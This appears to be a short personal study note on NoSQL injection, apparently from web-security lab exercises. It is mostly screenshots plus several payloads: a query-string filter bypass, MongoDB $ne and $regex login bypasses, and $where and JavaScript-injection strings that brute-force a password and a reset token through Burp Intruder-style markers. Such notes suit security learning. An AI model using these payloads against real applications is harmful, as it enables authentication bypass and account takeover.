# NoSQL Injection

Created: May 1, 2025 1:33 PM

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image.png)

```bash
/filter?category='||'1'=='1'%00
```

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%201.png)

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%202.png)

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%203.png)

```bash
{"username":{"$regex":"adm.*"},"password":{"$ne":"invalid"}}
```

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%204.png)

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%205.png)

```bash
/user/lookup?user=administrator' && this.password.length=='8
```

```bash
/user/lookup?user=administrator' && this.password[§0§]=='§a§
```

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%206.png)

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%207.png)

```bash
{"username":"carlos","password":{
"$ne":"kek"
},
"$where":"Object.keys(this)[4].match('^.{§0§}§a§.*')"
}
```

```bash
{"username":"carlos","password":{
"$ne":"kek"
},
"$where":"this.forgotPwd[§0§] == '§1§'"
}
```

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%208.png)

![image.png](NoSQL%20Injection%201e6021737a8980adb663fb1c150ec209/image%209.png)